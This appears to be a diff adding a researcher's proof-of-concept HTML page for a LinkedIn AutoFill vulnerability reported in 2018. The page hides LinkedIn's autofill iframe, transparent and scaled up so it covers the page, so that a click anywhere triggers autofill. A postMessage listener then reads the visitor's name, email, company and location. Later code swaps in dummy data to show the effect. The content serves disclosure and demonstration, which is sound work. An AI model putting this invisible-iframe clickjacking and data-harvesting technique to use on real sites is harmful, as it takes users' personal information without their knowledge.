@@ -1,0 +1,63 @@
+<h1 style="padding-bottom: 2000px">Click on this page!
+(This is a demonstration of my LinkedIn AutoFill vulnerability, as it functioned until my report on 4/9/18)</h1>
+<style>
+    .container {
+        position: relative;
+        height:100%;
+        width:100%;
+        overflow: hidden;
+    }
+    .i {
+        position: absolute;
+        top:-1000px;
+        left:-1000px;
+        width:100%;
+        height: 30px;
+        opacity:0;
+        -ms-zoom: 500;
+        -moz-transform: scale(500);
+        -moz-transform-origin: 0 0;
+        -o-transform: scale(500);
+        -o-transform-origin: 0 0;
+        -webkit-transform: scale(500);
+        -webkit-transform-origin: 0 0;
+    }
+</style>
+<div class="container">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <iframe class="i" frameborder="0" src="https://www.linkedin.com/autofill/"></iframe>
+</div>
+
+<script>
+window.addEventListener("message", receiveMessage, false);
+
+function receiveMessage(event)
+{
+  if (event.origin == 'https://www.linkedin.com') {
+    let data = JSON.parse(event.data).data;
+    if (data.email) {
+      alert('Hi, ' + data.firstname + ' ' + data.lastname + '! Your email is ' + data.email + '. You work at ' + data.company + ' and you live in ' + data.city + ', ' + data.state + '.');
+      console.log(data);
+    }
+  }
+  console.log(event)
+}
+
+// CODE ADDED TO DEMONSTRATE VULNERABILITY AS BEFORE 4/9/18
+$(document).on('click','body *',function(){
+  var data = JSON.parse('{\"city\":\"Chicago\",\"zip\":\"60601\",\"email\":\"demo@example.com\",\"state\":\"IL\",\"firstname\":\"First\",\"country\":\"us\",\"lastname\":\"Last\",\"company\":\"Company X\",\"title\":\"Founder\"}');
+  alert('This would have exposed your data here: Hi, ' + data.firstname + ' ' + data.lastname + '! Your email is ' + data.email + '. You work at ' + data.company + ' and you live in ' + data.city + ', ' + data.state + '.');
+});
+</script>
+
+<style>
+  iframe {
+    width: 400px;
+    height: 100px;
+    position: absolute;
+    top: 10px;
+    left: -14px;
+    opacity: 0;
+    z-index: 1;
+  }
+</style>
